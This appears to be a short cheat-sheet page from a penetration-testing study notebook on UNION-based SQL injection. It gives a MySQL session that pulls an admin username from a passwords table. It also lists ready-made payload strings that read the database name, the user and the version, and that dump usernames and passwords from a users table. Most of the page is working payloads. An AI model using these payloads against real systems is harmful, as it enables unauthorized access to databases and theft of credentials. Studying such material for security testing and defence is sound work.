# UNION Based SQL Injection





## Recap

UNION clauses allow for an additional SQL statement. It's always worth testing for this type of injection. WE MUST FILL ADDITIONAL COLUMNS WITH JUNK DATA.

```shell-session
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```



### Examples

```sql
%' UNION SELECT database(), user(), @@version, null, null -- //
```

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



```sql
' UNION SELECT null, null, database(), user(), @@version  -- //
```

```sql
' UNION SELECT null, username, password, description, null FROM users -- //
```

> \
>
